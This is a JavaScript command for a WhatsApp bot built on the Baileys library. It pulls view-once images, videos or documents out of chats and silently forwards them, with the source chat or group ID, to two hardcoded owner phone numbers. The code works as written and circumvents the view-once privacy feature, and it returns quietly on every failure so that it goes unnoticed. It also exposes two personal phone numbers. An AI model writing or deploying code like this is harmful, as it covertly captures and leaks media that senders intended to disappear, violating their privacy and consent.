import { downloadMediaMessage } from '@whiskeysockets/baileys';
import { logger } from '../utils/helpers.js';
import { Database } from '../utils/database.js';

export default {
    name: 'onceview',
    description: 'Extrae un mensaje view-once (imagen, video o documento) y lo envía a los dueños en privado.',
    aliases: ['ov'],
    async execute({ sock, message, args }) {
        try {
            const { key, message: msg } = message;
            const { remoteJid, participant } = key;
            const OWNERS = [
                '593978619941@s.whatsapp.net',
                '593978971824@s.whatsapp.net'
            ];
            const sender = participant || remoteJid;

            // Verificar si es un chat grupal
            const isGroup = remoteJid.endsWith('@g.us');

            if (isGroup) {
                // Verificar si el comando ya se usó en este grupo
                const groupUsage = (await Database.get(`onceview_${remoteJid}`)) || 0;
                if (groupUsage >= 1) {
                    return; // Silencioso, no enviar mensaje
                }

                // Verificar si el usuario es administrador
                const groupMetadata = await sock.groupMetadata(remoteJid);
                const admins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
                if (!admins.includes(sender)) {
                    return; // Silencioso, no enviar mensaje
                }

                // Registrar uso en el grupo
                await Database.set(`onceview_${remoteJid}`, groupUsage + 1);
            }

            // Obtener mensaje citado si existe
            let target = message;
            const quotedInfo = msg?.extendedTextMessage?.contextInfo;
            if (quotedInfo?.quotedMessage) {
                target = {
                    key: {
                        id: quotedInfo.stanzaId || message.key?.id,
                        remoteJid,
                        fromMe: false,
                        participant: quotedInfo.participant || message.key.participant || undefined
                    },
                    message: quotedInfo.quotedMessage
                };
            }

            // Extraer mensaje view-once
            const viewOnce = target.message?.viewOnceMessage?.message ||
                           target.message?.viewOnceMessageV2?.message;

            if (!viewOnce) {
                return; // Silencioso, no enviar mensaje
            }

            const imageMsg = viewOnce.imageMessage;
            const videoMsg = viewOnce.videoMessage;
            const docMsg = viewOnce.documentMessage;

            if (!imageMsg && !videoMsg && !docMsg) {
                return; // Silencioso, no enviar mensaje
            }

            // Descargar medio
            const mediaBuffer = await downloadMediaMessage(
                { message: viewOnce, key: target.key },
                'buffer',
                {},
                { reuploadRequest: sock.updateMediaMessage }
            );

            // Preparar información de origen
            const sourceText = isGroup
                ? `📍 Grupo: ${remoteJid}`
                : `📍 Chat: ${remoteJid}`;

            // Enviar medio a todos los dueños
            for (const ownerJid of OWNERS) {
                if (imageMsg) {
                    await sock.sendMessage(ownerJid, {
                        image: mediaBuffer,
                        caption: `📸 View-once recuperado\n${sourceText}`
                    });
                } else if (videoMsg) {
                    await sock.sendMessage(ownerJid, {
                        video: mediaBuffer,
                        caption: `🎥 View-once recuperado\n${sourceText}`
                    });
                } else if (docMsg) {
                    await sock.sendMessage(ownerJid, {
                        document: mediaBuffer,
                        mimetype: docMsg.mimetype,
                        fileName: docMsg.fileName || 'archivo'
                    });
                    await sock.sendMessage(ownerJid, { text: sourceText });
                }
            }

            logger.info(`View-once (${imageMsg ? 'imagen' : videoMsg ? 'video' : 'documento'}) enviado a dueños desde ${remoteJid}`);
        } catch (error) {
            logger.error(error, 'Error en comando onceview');
        }
    }
};